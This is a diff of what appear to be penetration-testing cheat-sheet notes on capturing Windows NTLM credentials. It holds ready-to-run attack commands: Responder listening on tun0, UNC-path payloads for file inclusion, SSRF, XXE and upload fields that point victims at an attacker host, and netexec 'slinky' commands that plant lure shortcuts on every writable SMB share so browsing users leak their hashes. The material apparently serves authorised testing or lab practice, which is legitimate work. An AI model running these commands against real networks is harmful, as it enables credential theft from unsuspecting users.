@@ -13,7 +13,8 @@ sudo responder -I tun0
 - [ ] File inclusion on a Windows web server: ?<Param>=\\<LHOST>\share\x
 - [ ] SSRF, XXE or an upload that takes a path: \\<LHOST>\share or file://<LHOST>/share
 - [ ] A shell as another user: dir \\<LHOST>\share
-A lure on every share I can write, for whoever browses it. At the pwn-broker prompt: tool install netexec and tool install impacket.
+At the pwn-broker prompt: tool install netexec and tool install impacket.
+A lure on every share I can write, for whoever browses it:
 nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important
 nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important CLEANUP=True
 - [ ] The second line removes the lure afterwards
